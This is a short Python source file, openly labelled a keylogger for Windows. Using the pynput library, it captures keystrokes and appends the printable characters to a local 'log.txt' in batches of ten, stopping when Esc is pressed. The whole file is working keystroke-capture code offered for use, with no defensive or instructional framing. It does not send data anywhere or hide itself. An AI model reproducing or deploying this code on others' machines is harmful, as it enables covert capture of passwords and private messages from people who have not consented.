# Python code for keylogger, saves the data onto the log file "log.txt"
# To be used for Windows
from pynput.keyboard import Key, Listener



count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("{0} pressed ".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    # Opens log.txt to read current keystrokes
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            # Creates a new line every time space is pushed
            if k.find("space") > 0:
                f.write('\n')
            # Records keystrokes pushed
            elif k.find("Key") == -1:
                f.write(k)
# Stops the listener
def on_release(key):
        if key == Key.esc:
            return False

# Collects events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()